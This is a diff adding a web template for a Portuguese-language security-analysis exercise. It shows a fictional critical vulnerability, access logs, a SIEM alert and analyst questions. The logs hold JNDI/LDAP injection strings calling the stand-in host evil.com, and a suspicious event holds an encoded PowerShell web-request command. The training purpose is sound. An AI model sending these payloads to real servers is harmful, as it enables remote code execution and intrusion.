@@ -1,0 +1,57 @@
+{% extends "base.html" %}
+
+{% block title %}Public to Private Exploit{% endblock %}
+
+{% block content %}
+
+<h2>🚨 Public to Private Exploit Anomaly</h2>
+
+<h3>📌 Contexto</h3>
+<p>
+Uma vulnerabilidade crítica foi divulgada publicamente. Após algumas horas,
+atividades suspeitas foram detectadas no servidor web.
+</p>
+
+<h3>🧾 Informações da Vulnerabilidade</h3>
+<pre>
+CVE-2024-9999
+Tipo: RCE
+Software: Apache Struts
+Publicado: 10:00
+Exploit público: 11:30
+</pre>
+
+<h3>🌐 Logs de Acesso</h3>
+<pre>
+12:05:23 - 45.153.34.205 - GET /index.action?redirect=${jndi:ldap://evil.com/a}
+12:05:24 - 500
+12:06:01 - 45.153.34.205 - GET /index.action?redirect=${jndi:ldap://evil.com/b}
+12:06:02 - 200
+12:07:10 - 10.0.0.15 - POST /admin/upload
+12:07:12 - 200
+</pre>
+
+<h3>🚨 Alerta SIEM</h3>
+<pre>
+Possível exploração de RCE detectada
+IP origem: 45.153.34.205
+</pre>
+
+<h3>💻 Evento suspeito</h3>
+<pre>
+cmd.exe /c powershell -enc aW52b2tlLXdlYnJlcXVlc3Q=
+</pre>
+
+<hr>
+
+<h3>🧠 Perguntas</h3>
+
+<ol>
+    <li>Houve exploração bem-sucedida?</li>
+    <li>Qual evidência indica isso?</li>
+    <li>Qual foi o vetor de ataque?</li>
+    <li>O que o atacante fez após explorar?</li>
+    <li>Quais ações você recomendaria?</li>
+</ol>
+
+{% endblock %}
